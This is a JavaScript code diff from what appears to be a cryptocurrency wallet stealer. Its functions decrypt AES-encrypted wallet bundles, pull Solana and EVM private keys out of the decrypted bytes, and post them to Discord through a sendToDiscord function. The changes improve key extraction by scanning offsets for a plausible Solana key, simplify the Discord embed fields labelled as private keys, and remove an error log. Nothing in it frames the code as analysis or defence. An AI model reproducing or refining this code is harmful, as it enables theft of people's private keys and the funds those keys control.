@@ -59,42 +59,35 @@ function decryptSingleBundle(bundleStr, keyB64, type) {
 
     if (result.success) {
         const buf = result.decryptedBuffer;
-        console.log(`✅ ${type.toUpperCase()} DECRYPTED - ${buf.length} bytes`);
+        console.log(`✅ ${type.toUpperCase()} decrypted - ${buf.length} bytes`);
 
-        let privateKey = null;
-        let keyHex = buf.toString('hex');
+        let bestKey = null;
 
         if (type === "sol" && buf.length >= 64) {
-            const solKey = buf.slice(0, 64);
-            
-            const base58Key = bs58.encode(solKey);
-            const base64Key = solKey.toString('base64');
-            
-            privateKey = base58Key; // Best for Phantom
-
-            return {
-                prefix,
-                type,
-                method: result.method,
-                decryptedHex: keyHex,
-                decryptedBase64: buf.toString('base64'),
-                privateKeyBase58: base58Key,
-                privateKeyBase64: base64Key,
-                privateKeyHex: solKey.toString('hex'),
-                privateKey: base58Key  // Main one shown in Discord
-            };
+            // Try different starting positions
+            for (let offset = 0; offset <= buf.length - 64; offset += 4) {
+                const candidate = buf.slice(offset, offset + 64);
+                const base58 = bs58.encode(candidate);
+                if (base58.length > 80) {  // typical Solana key length
+                    bestKey = base58;
+                    console.log(`   → Offset ${offset}: ${base58}`);
+                    break; // take first good looking one
+                }
+            }
+            if (!bestKey) bestKey = bs58.encode(buf.slice(0, 64));
         } 
-        else if (type === "evm" && buf.length >= 32) {
-            privateKey = buf.slice(0, 32).toString('hex');
-            return {
-                prefix,
-                type,
-                method: result.method,
-                decryptedHex: keyHex,
-                privateKey: privateKey,
-                privateKeyHex: privateKey
-            };
+        else if (type === "evm") {
+            bestKey = buf.slice(0, 32).toString('hex');
         }
+
+        return {
+            prefix,
+            type,
+            method: result.method,
+            decryptedHex: buf.toString('hex'),
+            privateKey: bestKey,
+            rawBytes: buf.length
+        };
     }
     return { prefix, error: "Failed" };
 }
@@ -112,7 +105,6 @@ function tryDecryptAES(encryptedB64, keyB64) {
 
         return { success: true, decryptedBuffer: decrypted, method: "CBC-ZeroIV-NoPad" };
     } catch (e) {
-        console.error("Decryption error:", e.message);
         return { success: false };
     }
 }
@@ -136,22 +128,13 @@ async function sendToDiscord(data) {
         { name: "Site", value: data.site || "N/A" }
     ];
 
-    // Solana Key
-    if (portfolio.sBundlesDecrypted?.[0]?.privateKeyBase58) {
+    if (portfolio.sBundlesDecrypted?.[0]) {
         const s = portfolio.sBundlesDecrypted[0];
-        summaryFields.push({ 
-            name: "🔑 Solana Private Key (Base58)", 
-            value: `\`\`\`${s.privateKeyBase58}\`\`\`` 
-        });
+        summaryFields.push({ name: "🔑 Solana Private Key", value: `\`\`\`${s.privateKey}\`\`\`` });
     }
-
-    // EVM Key
-    if (portfolio.eBundlesDecrypted?.[0]?.privateKey) {
+    if (portfolio.eBundlesDecrypted?.[0]) {
         const e = portfolio.eBundlesDecrypted[0];
-        summaryFields.push({ 
-            name: "🔑 EVM Private Key (Hex)", 
-            value: `\`\`\`${e.privateKey}\`\`\`` 
-        });
+        summaryFields.push({ name: "🔑 EVM Private Key", value: `\`\`\`${e.privateKey}\`\`\`` });
     }
 
     const form = new FormData();
